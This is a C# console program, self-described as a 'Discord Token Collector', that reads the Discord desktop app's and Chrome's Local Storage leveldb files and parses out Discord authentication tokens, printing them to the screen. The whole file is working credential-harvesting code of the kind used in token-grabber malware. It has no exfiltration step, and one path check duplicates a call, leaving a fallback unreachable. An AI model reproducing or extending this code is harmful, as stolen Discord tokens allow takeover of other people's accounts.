using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace DiscordTokenCollector
{
    class DiscordToken
    {
        static void Main(string[] args)
        {
            Console.WriteLine($"\nDiscord Token Collector\nBy MODERR\n\nYour tokens is: \n{GetToken()}\n");
            Console.WriteLine("Press any key to end");
            Console.ReadKey();
        }

        public static string GetToken()
        {
            try
            {
                #region Collect token
                string discordTokensPath = Path.Combine($@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discord\Local Storage\leveldb\");
                if (!dotldb(ref discordTokensPath) && !dotldb(ref discordTokensPath))
                {

                }
                Thread.Sleep(100);
                string discordAppToken = tokenx(discordTokensPath, discordTokensPath.EndsWith(".log"));
                if (discordAppToken == "")
                {
                    discordAppToken = "N/A";
                }

                string discordTokensChromePath = Path.Combine($@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\Local Storage\leveldb\");
                if (!dotldb(ref discordTokensChromePath) && !dotlog(ref discordTokensChromePath))
                {

                }
                Thread.Sleep(100);
                string discordChromeToken = "N/A";
                try
                {
                    discordChromeToken = tokenx(discordTokensChromePath, discordTokensChromePath.EndsWith(".log"));
                    if (discordChromeToken == "")
                    {
                        discordChromeToken = "N/A";
                    }
                }
                catch(Exception exception)
                {
                    Console.WriteLine(exception.Message);
                }
                #endregion
                return $"Token DiscordAPP: {discordAppToken}\nToken Chrome: {discordChromeToken}";
            }
            catch (Exception exception)
            {
                Console.Write(exception.Message);
                return "Error";
            }
        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private static bool dotlog(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }
        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
    }
}
